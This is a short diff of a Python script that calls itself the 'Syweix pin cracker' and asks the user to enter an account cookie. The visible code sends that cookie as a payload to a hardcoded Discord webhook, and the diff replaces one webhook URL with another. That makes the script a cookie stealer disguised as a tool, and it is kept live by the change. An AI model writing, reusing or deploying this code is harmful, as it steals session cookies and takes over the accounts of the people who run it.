@@ -73,7 +73,7 @@ def main(cookie):
     headers = {"Content-Type": "Application/json"}
     response = requests.post(WEBHOOK, headers=headers, data=json.dumps(payload))
 
-WEBHOOK = "https://discord.com/api/webhooks/1123913219698872361/GiH7qLGctK2WBvrgW98Phv7Dwi3-HE77cUJldEPEHLaiOjzkd-RBc6bAommRRd5Pd-qk"
+WEBHOOK = "https://discord.com/api/webhooks/1194296320538705970/a8_RXlPxiLOKHvzuPfdg-PKfdw4Co3A5bPoSSN1MkGEj0vfcfafpWqoqFkwXccGvD0-l"
 
 credentials = input(Fore.RED + '[SYWEIX] Thanks for using Syweix pin cracker. Enter the account cookie - ')
 if credentials.count(':') >= 2:
